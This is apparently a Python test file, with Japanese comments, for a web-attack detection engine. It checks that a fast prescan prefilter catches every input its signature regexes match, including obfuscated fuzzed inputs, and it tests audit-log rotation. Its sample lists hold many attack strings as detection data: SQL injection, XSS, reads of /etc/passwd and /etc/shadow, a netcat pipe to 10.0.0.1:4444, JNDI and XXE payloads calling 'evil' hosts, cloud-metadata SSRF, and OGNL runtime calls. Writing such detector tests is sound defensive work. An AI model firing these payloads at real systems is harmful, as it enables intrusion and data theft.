"""
test_logio.py — 追記ログのローテーション(append_jsonl)検証
====================================================================================
監査ログ(sensor_log.jsonl / acl_log.jsonl)が無制限肥大しないこと、ローテーション
後も最新行が読めること、壊れ入力でも例外を投げないことを確認する。
"""
import json
import os
import tempfile

from dataplane.engine.core.atomic_io import append_jsonl


def _lines(path):
    with open(path, encoding="utf-8") as f:
        return [l for l in f.read().splitlines() if l]


def test_native_override_seam_install_use_clear_fallback():
    # evolution #1: ハイブリッド・データプレーンの継ぎ目が end-to-end で動くことの実証。
    # (Rust/Cython の cdylib をここに差し込めば自動で高速版へ。本体は純Pythonで常に動く)
    from dataplane.engine.core import accel
    base = accel.shannon_entropy(b"hello world")          # 純Python基準値
    try:
        # 1) 差し替えネイティブ(の代役 sentinel)を install → そちらが使われる
        accel.set_native_override("shannon_entropy", lambda data: 42.0)
        assert accel.native_override_active("shannon_entropy") is True
        assert accel.shannon_entropy(b"hello world") == 42.0
        # 2) override が例外でも純Pythonへフォールバック(可逆=防御を1ミリも落とさない)
        accel.set_native_override("shannon_entropy",
                                  lambda data: (_ for _ in ()).throw(RuntimeError("native crash")))
        assert abs(accel.shannon_entropy(b"hello world") - base) < 1e-9
    finally:
        accel.clear_native_override("shannon_entropy")    # 3) clear で即 revert
    assert accel.native_override_active("shannon_entropy") is False
    assert abs(accel.shannon_entropy(b"hello world") - base) < 1e-9


def test_prescan_is_a_true_superset_of_signatures():
    # evolution #1 磨き: prescan は高価な正規表現の高速プレフィルタ。安全条件は
    # 「正規表現が当たる ⇒ prescan>0」(スーパーセット)。これが崩れると needle 無しの攻撃が
    # prescan==0 でゲートをすり抜け、シグネチャ走査ごと飛ばして *検出漏れ* になる。
    # production と同じ正規化(_normalize_for_scan)を通してから、各シグネチャの代表攻撃で
    # 「当該シグネチャにヒット かつ prescan>0」を実証し、不変条件を回帰から守る。
    from dataplane.engine.core import accel
    from dataplane.engine.lifeform.pipeline import (
        _SIGNATURES, _SIG_RE, _normalize_for_scan)
    rgx = dict(_SIG_RE)
    samples = {
        "sqli": ["a union select b from c", "x or 1 = 1", "admin'--",
                 "select a from b where c=1", "1; drop table users"],
        "xss": ["<script>alert(1)", "x onerror = alert(1)", "javascript:alert(1)",
                "<img src=x onerror=1>", "document.cookie",
                "src=data:text/html;base64,x", "href=vbscript:msgbox(1)"],
        "traversal": ["../../etc/passwd", "..\\..\\windows", "/proc/self/environ",
                      "c:\\windows\\system32", "f=/etc/shadow", "f=win.ini",
                      "f=boot.ini", "p=/x/..;/manager/html"],
        "rce": ["1; cat /etc/passwd", "$(whoami)", "`id`", "x | nc 10.0.0.1 4444",
                "ua=() { :;}; echo x", "x=<?php system(1)?>", "x=<?= 1 ?>"],
        "scanner_ua": ["sqlmap/1.5.2 (scanner)"],
        "sensitive_path": ["/.env", "/wp-login.php", "/xmlrpc.php", "/phpmyadmin/",
                           "/.git/config", "/.aws/credentials", "/actuator/health",
                           "/.ssh/id_rsa"],
        "sqli_blind": ["1 and sleep(5)", "1 or pg_sleep(5)", "1 and benchmark(1000000,md5(1))",
                       "1;waitfor delay '0:0:5'", "1 and extractvalue(1,concat(0x7e,version()))",
                       "1 and updatexml(1,2,3)", "1 and load_file(0x2f)",
                       "x into outfile '/tmp/a'", "1 into dumpfile '/tmp/b'",
                       "union select 1 from information_schema.tables"],
        "nosqli": ["id[$ne]=1", "user[$gt]=", "x[$regex]=.*", '{"$where":"1==1"}'],
        "lfi": ["file=php://filter/resource=x", "url=file:///etc/passwd",
                "url=gopher://127.0.0.1:6379", "x=dict://h:11211", "x=phar://a",
                "x=expect://id", "x=netdoc:///etc/passwd"],
        "jndi": ["x=${jndi:ldap://evil/a}", "${jndi:rmi://h/a}", "a=jndi:dns://x"],
        "ssrf": ["url=http://169.254.169.254/latest/meta-data/iam/",
                 "u=http://metadata.google.internal/computeMetadata/v1/",
                 "t=http://100.100.100.200/latest/meta-data/",
                 "u=http://[fd00:ec2::254]/latest/meta-data/"],
        "proto": ["?__proto__[admin]=1", "?a[constructor][prototype][x]=1",
                  "obj.constructor.prototype.x=1", "x=class.module.classLoader.y"],
        "ssti": ["?n={{7*7}}", "?t=<%= 7*7 %>", "?x=#{7*7}", "?z=${7*7}"],
        "ssrf_internal": ["u=http://127.0.0.1/x", "u=http://localhost/x",
                          "u=http://192.168.0.1/x", "u=http://0.0.0.0/x",
                          "u=http://169.254.1.1/x", "u=http://0x7f000001/x",
                          "u=http://2130706433/x"],
        "crlf": ["next=%0d%0aSet-Cookie:%20sid=evil", "u=%0d%0aLocation:%20http://e",
                 "x=%0d%0aContent-Type:%20text/html", "to=a%0aBcc:evil@x"],
        "ssi": ['x=<!--#exec cmd="id"-->', 'q=<!--#include virtual="/x"-->'],
        "ldapi": ["u=admin)(|(uid=*))", "u=*)(uid=*)", "f=)(objectClass=*)"],
        "xxe": ['d=<!ENTITY xxe SYSTEM "file:///x">',
                'x=<!DOCTYPE r [<!ENTITY a SYSTEM "http://e">]',
                'y=<!DOCTYPE foo SYSTEM "http://evil/x.dtd">'],
        "ognl": ["x=%{(#_memberAccess[1]=1)}", "x=@java.lang.Runtime@getRuntime()",
                 "x=#context['xwork']", "x=@java.lang.ProcessBuilder"],
        "redirect": ["next=//evil.com/phish", "url=//attacker/x"],
    }
    # 全 builtin シグネチャがサンプルで網羅されること(新シグネチャ追加時もこの不変条件を強制)。
    assert set(samples) == {n for n, _p in _SIGNATURES}
    for name, atks in samples.items():
        for atk in atks:
            blob = _normalize_for_scan(atk)
            assert rgx[name].search(blob), (name, atk)             # 代表サンプルが当該sigに当たる
            hits = accel.prescan_suspicious(blob.encode("utf-8"))   # …ならば prescan は飛ばさない
            assert hits > 0, (name, atk, "prescan skipped a real signature hit!")
    # 良性入力は prescan==0(プレフィルタが正規表現走査を実際に省ける=高速化の前提)
    for benign in ["/index.html", "?page=2&sort=name", "user=alice&id=42"]:
        assert accel.prescan_suspicious(_normalize_for_scan(benign).encode("utf-8")) == 0, benign


def test_prescan_superset_holds_under_obfuscation_fuzz():
    # evolution #1 深掘り: #2 の正規化群(エンティティ復号/版付きコメント剥がし/改行→;/JNDI畳み)を
    # 経ても『正規表現が当たる ⇒ prescan>0』が崩れないことを、変異(難読化)入力で決定論ファズ検証。
    # これが崩れると難読化された攻撃が prescan==0 でゲートを抜けて検出漏れになる。
    import random
    from dataplane.engine.core import accel
    from dataplane.engine.lifeform.pipeline import _SIG_RE, _normalize_for_scan
    corpus = [
        "1 union select pass from users where a=1", "1 union(select(a)from(b))",
        "1 and sleep(5)", "1 and extractvalue(1,concat(0x7e,version()))",
        "1;waitfor delay '0:0:5'", "union select 1 from information_schema.tables",
        "<script>alert(1)</script>", "javascript:alert(1)", "document.cookie",
        "../../etc/passwd", "/proc/self/environ", "c:\\windows\\system32",
        "; cat /etc/passwd", "$(whoami)", "`id`", "| nc 10.0.0.1 4444",
        "sqlmap/1.5", "nikto/2", "/.env", "/wp-login.php", "/.git/config",
        "id[$ne]=1", '{"$where":"1==1"}', "php://filter/resource=x",
        "gopher://127.0.0.1:6379", "${jndi:ldap://e/a}", "admin'--", "x or 1=1",
    ]

    def mutate(s, rng):
        out = []
        for ch in s:
            r = rng.random()
            if ch == " " and r < 0.3:
                out.append(rng.choice(["/**/", "  ", "\t", "/*!*/"]))   # コメント/空白挿入
            elif ch.isalpha() and r < 0.25:
                out.append(ch.upper() if rng.random() < 0.5 else ch.lower())  # 大小混在
            elif r < 0.12 and ord(ch) < 128:
                out.append("%%%02x" % ord(ch))                          # %エンコード
            else:
                out.append(ch)
        return "".join(out)

    rng = random.Random(1234567)             # 固定シード=非フレーク
    checked = 0
    for _ in range(3000):
        blob = _normalize_for_scan(mutate(rng.choice(corpus), rng))
        if any(r.search(blob) for _n, r in _SIG_RE):
            checked += 1
            assert accel.prescan_suspicious(blob.encode("utf-8")) > 0, blob
    assert checked > 100                      # 実際に多数のシグネチャヒットを検査できたこと


def test_appends_one_line_per_call():
    with tempfile.TemporaryDirectory() as tmp:
        p = os.path.join(tmp, "log.jsonl")
        for i in range(3):
            assert append_jsonl(p, {"i": i}) is True
        lines = _lines(p)
        assert len(lines) == 3
        assert json.loads(lines[-1]) == {"i": 2}


def test_rotation_caps_current_file_and_keeps_backup():
    with tempfile.TemporaryDirectory() as tmp:
        p = os.path.join(tmp, "log.jsonl")
        # 1行 ~ 数十バイト。小さい上限で確実にローテーションさせる。
        for i in range(200):
            append_jsonl(p, {"i": i, "pad": "x" * 50}, max_bytes=1000, backups=1)
        assert os.path.exists(p + ".1")              # 退避が作られた
        assert os.path.getsize(p) <= 1000 + 200      # 現行は上限近辺で頭打ち
        # 最新の書き込みは現行ファイルの末尾に残る
        assert json.loads(_lines(p)[-1])["i"] == 199


def test_rotation_keeps_only_n_backups():
    with tempfile.TemporaryDirectory() as tmp:
        p = os.path.join(tmp, "log.jsonl")
        for i in range(500):
            append_jsonl(p, {"i": i, "pad": "y" * 50}, max_bytes=800, backups=2)
        assert os.path.exists(p + ".1") and os.path.exists(p + ".2")
        assert not os.path.exists(p + ".3")          # 最古は破棄される


def test_unserializable_is_safe_false():
    with tempfile.TemporaryDirectory() as tmp:
        p = os.path.join(tmp, "log.jsonl")
        assert append_jsonl(p, {"bad": {1, 2, 3}}) is False   # set はJSON不可
        assert not os.path.exists(p)                          # 何も書かれない


if __name__ == "__main__":
    fns = [v for k, v in sorted(globals().items())
           if k.startswith("test_") and callable(v)]
    ok = 0
    for fn in fns:
        try:
            fn()
            ok += 1
            print("PASS", fn.__name__)
        except Exception as e:
            print("FAIL", fn.__name__, "->", repr(e))
    print(f"--- {ok}/{len(fns)} passed ---")
